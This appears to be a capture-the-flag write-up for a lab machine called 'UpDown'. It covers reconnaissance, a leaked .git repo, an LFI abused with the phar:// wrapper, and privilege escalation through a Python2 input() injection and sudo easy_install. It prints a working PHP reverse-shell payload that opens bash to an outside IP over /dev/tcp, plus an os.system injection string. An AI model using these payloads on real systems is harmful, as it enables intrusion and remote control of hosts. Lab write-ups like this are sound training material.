---
title: "UpDown - Writeup"
date: 2026-01-09T23:42:00
description: Shortcodes sample
menu:
  sidebar:
    name: UpDown
    identifier: updown
    weight: 40
mermaid: true
---

# Service Scan

Nmap scan show that port 22(ssh) and 80(http) are open.

```bash updown.nmap
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
|_http-title: Is my Website up ?
```

# Attacking HTTP(80)

Just visiting the homepage I found it domain is http://siteisup.htb . So I add it to my hosts.

## Directory Fuzzing

I started `ferobuster` and found some interesting directories.

```bash
feroxbuster -w `fzf_wdlists` --dont-extract-links -u 'http://siteisup.htb'

...SNIP...

200      GET        0l        0w        0c http://siteisup.htb/dev/
301      GET        9l       28w      315c http://siteisup.htb/dev/.git => http://siteisup.htb/dev/.git/
```

## Analyzing the git repo

I found out that http://siteisup.htb/dev/.git/ is a git repository. So I used a tool called `git-dumper`. By viewing `git log` found that there is new vhost called http://dev.siteisup.htb. But it give me **403 Forbidden**.

## Analyze Source Code

Inside `.htaccess` , custom header is set to prevent access. So I add `Special-Dev: only4dev` to header by using burp proxy > match and replace.

### Analyze `index.php`

There is LFI vulnerability on code that only filter blacklist words and render file that end with `.php`. Default rendering page is `checker.php`.

### Analyze `checker.php`

There is a file upload function that use php extensions to blacklist and store the file inside the directory called, "**uploads**" by using md5 as file name. It also check file contents using backlist words such as "file://", "ftp://" and "data://". Finally it delete uploaded files.

## Attack Chain

1. Craft payload by adding php file to a zip
2. Upload the payload
3. Abuse the Php Wrapper [[PHP Wrappers#Phar Wrapper|phar://]] on LFI

First of all I use simple php code: `<?php echo "Hello World"; ?>`. I create a zip and rename the zip to other file extensions to bypass the blacklist extensions.

Second, I need to know the location of uploaded file. So I check `/uploads` dir and found the file.

> [!warning]
> All uploaded files are auto deleted every 5 minutes.

Finally by abusing php wrapper on LFI with the format `phar://LOCATION_TO_ZIP/PHP_FILE`. So the final Url will look like: http://dev.siteisup.htb/?page=phar://uploads/a807a329197b99783be799cdb81509cb/hello.jpeg/hello

> [!failure]
> Some dangerous native functions of php are blocked like `system`

So I used a tool called `dfunc-bypasser` that need to feed `phpinfo()` and found that `proc_open` is allowed.

## Foothold as `www-data`

The contents of php payload for reverse shell using `proc_open` is

```php
<?php

$command = "bash -c 'bash -i >& /dev/tcp/10.10.14.105/443 0>&1' ";
$descriptorspec = array(
    0 => array( // stdin
        'pipe',
        'r',
        'a' // append
    ),
    1 => array( // stdout
        'pipe',
        'w',
        'a' // append
    ),
    2 => array( // stderr
        'pipe',
        'w',
        'a' // append
    ),
);

$process = proc_open($command, $descriptorspec, $pipes);
?>
```

# Privilege Escalation

First I need to escalate to user, developer and final to the root.

## Abuse Python2 `input`

There is interesting file under home directory of developer that called `siteisup` that also had SUID bit and under the hood it call a python script called `siteisup_test.py`

```python title:siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

In python2, that input function is not safe and can inject command. I will use the payload as below:

```bash
Enter URL here:__import__("os").system("id")
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```

So I will change the command to `bash -p` to abuse SUID and get developer ssh key. The developer user had sudo right access to `easy_install` . Lucky for us, it is on GTFOBins and got root easily.
